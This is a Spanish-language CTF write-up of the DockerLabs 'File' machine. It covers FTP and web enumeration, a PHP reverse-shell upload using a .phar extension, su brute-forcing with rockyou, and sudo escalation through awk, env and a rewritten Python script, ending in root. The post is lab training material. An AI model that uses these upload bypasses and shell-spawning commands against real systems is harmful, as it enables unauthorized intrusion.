---
title: "FILE DOCKERLABS"
date: 2025-05-20 10:00:00 +0000
categories: [DockerLabs]
tags: [DockerLabs, CTF]
image: /assets/img/DockerLabs/MachineFile/machine_file_dl.png
---


La máquina File de DockerLabs es un reto fácil orientado a principiantes en el pentesting. A lo largo del desafío se exploran técnicas clásicas como reconocimiento de servicios, enumeración de recursos web, y pasos de escalada de privilegios en un entorno Linux. Es una excelente práctica para familiarizarse con herramientas comunes y fortalecer el pensamiento lógico en escenarios de captura de bandera.



## INFORMACIÓN GENERAL

- **Plataforma**: DockerLabs
- **Sistema Operativo**: Linux
- **Dificultad**: Fácil

## DESPLIEGUE
```bash
bash autodeploy.sh file.tar
```
![despliegue](/assets/img/DockerLabs/MachineFile/despliegue.png)

## RECONOCIMIENTO
```bash
nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.17.0.2
```

```bash
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000010s latency).
Scanned at 2025-03-07 20:53:21 -05 for 9s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 65534    65534          33 Sep 12 21:50 anon.txt
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix
```
El puerto 80 está abierto y muestra la página por defecto del servidor Apache, según el escaneo de Nmap.
![web_apache](/assets/img/DockerLabs/MachineFile/web_apache.png)

## ENUMERACIÓN

En este punto, podemos pensar en enumerar la web, directorios ocultos, archivos, etc. Pero sin olvidar que podemos iniciar sesión de forma anónima por FTP, y Nmap reporta un archivo llamado `anon.txt`

```bash
ftp anonymous@172.17.0.2
```
![hash_ftp](/assets/img/DockerLabs/MachineFile/hash_ftp.png)
![crakstation](/assets/img/DockerLabs/MachineFile/crackstation.png )

Tenemos como resultado `justin`, si hacemos un intento de ataque de fuerza bruta con `hydra` por `ssh`, no tenemos éxito asi que vamos a enumerar directorios

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml,csv,txt,html -t 20 -b 500,502,404
```
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   500,502,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,xml,csv,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 11008]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/file_upload.php      (Status: 200) [Size: 468]
Progress: 1245858 / 1245864 (100.00%)
===============================================================
Finished
===============================================================
```
**✅ "⚠️ Importante: el directorio /uploads puede ser de interés, pero también hay un /file_upload.php."**
#### CONSEJO
Cuando realicé este CTF, corté el escaneo de Gobuster demasiado rápido al encontrar directorios interesantes. Sin embargo, es importante esperar a que termine el escaneo por completo, ya que `file_upload.php` apareció casi al final.

# EXPLOTACIÓN

Al encontrar esto, podemos pensar en la VULNERABILIDAD DE FILE UPLOAD, vamos a intentar mandarse una reverse shell, usaremos el archivo de nuestro amigo `Pentest Monkey`
[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell), Solo cambiamos la extensión a `.phar` porque el servidor tenía restricciones con ciertas extensiones. Probé con `.php`, pero no lo permitía.
Preparamos el archivo, ajustamos los parámetros necesarios y lo subimos.

![upload](/assets/img/DockerLabs/MachineFile/upload.png)

Ahora vamos al directorio `uploads`, nos ponemos en escucha por el puerto que definimos y ejecutamos 

![rev_shell_exito](/assets/img/DockerLabs/MachineFile/rev_shell_exito.png)


Para poder operar mejor podemos hacer un tratamiento de la TTY para obtener una bash interactiva
```bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
          reset xterm
export TERM=xterm
export SHELL=bash
```


## ESCALADA DE PRIVILEGIOS

No encontramos permisos SUID ni la forma clásica de escalar privilegios con `sudo -l` funciona, entonces vamos a realizar una fuerza bruta a usuarios con `su`
La herramienta que usaremos sera la siguiente: [su-bruteforce](https://github.com/carlospolop/su-bruteforce) 
los usuarios que tenemos son:
- fernando
- iker
- julen
- mario

Creamos el archivo y le damos permisos de ejecución
![archivo_bruteforce](/assets/img/DockerLabs/MachineFile/archivo_bash_bruteforce.png)

Ahora traemos el diccionario con el que aplicaremos la fuerza bruta, el rockyou.txt de nuestra maquina local

![server_python](/assets/img/DockerLabs/MachineFile/server_python.png)
![previa_brute_force](/assets/img/DockerLabs/MachineFile/previa_bruteforce.png)


Encontramos 2 credenciales de los usuarios: `mario` y `fernando`

![credenciales](/assets/img/DockerLabs/MachineFile/credenciales.png)

"Vamos a iniciar sesión con las credenciales `fernando:chocolate`, encontramos una imagen. Si aplicamos esteganografía, podremos recuperar la contraseña de `mario`, tal y como lo descubrió la herramienta, podemos cambiar al usuario `mario`
![escalda_julen](/assets/img/DockerLabs/MachineFile/escalada_juel.png)

como vemos podemos escalar al usuario `julen` mediante el binario `awk`, corremos a nuestra pagina de confianza [GTFOBins](https://gtfobins.github.io/)
```bash
sudo -u awk 'BEGIN {system("/bin/sh")}'
```
![julen_user](/assets/img/DockerLabs/MachineFile/julen_user.png)

Ahora si hacemos un `sudo -l` con el usuario julen, podemos escalar hacia iker mediante el binario `env` 

```bash
sudo -u iker env /bin/sh
```
![user_iker](/assets/img/DockerLabs/MachineFile/user_iker.png)

Hacemos `sudo -l` vemos que el usuario iker puede escalar mediante un archivo en python, la idea seria modificar el archivo para enviarnos una bash como root
Pero no tenemos permisos de escritura, solo de lectura. Sin embargo, podemos eliminarlo e ingresar contenido nuevo.

![iker_escalada](/assets/img/DockerLabs/MachineFile/escalada_user.png)
```bash
echo "import os" > geo_ip.py
echo "os.system('/bin/bash')" >> geo_ip.py
```

![geo.py](/assets/img/DockerLabs/MachineFile/geo.py.png)


```bash
sudo /usr/bin/python3 /home/iker/geo_ip.py
```
![root](/assets/img/DockerLabs/MachineFile/root.png)


#### HEMOS RESUELTO LA MAQUINA!


## ELIMINAR LA MAQUINA

```bash
ctrl + c
```

# GRACIAS POR LEER


